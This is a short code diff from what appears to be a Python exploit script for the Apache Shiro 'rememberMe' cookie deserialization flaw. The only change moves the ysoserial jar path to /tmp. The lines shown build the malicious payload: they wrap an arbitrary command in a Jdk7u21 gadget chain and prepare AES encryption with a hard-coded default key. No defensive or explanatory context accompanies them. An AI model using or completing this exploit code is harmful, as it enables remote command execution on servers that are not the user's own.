@@ -7,7 +7,7 @@ import subprocess
 from Crypto.Cipher import AES
  
 def encode_rememberme(command):
-    popen     = subprocess.Popen(['java', '-jar', '/pentest/java/ysoserial.jar', 'Jdk7u21', command], stdout=subprocess.PIPE)
+    popen     = subprocess.Popen(['java', '-jar', '/tmp/ysoserial.jar', 'Jdk7u21', command], stdout=subprocess.PIPE)
     BS        = AES.block_size
     pad       = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
     key       = "kPH+bIxk5D2deZiIxcaaaA=="
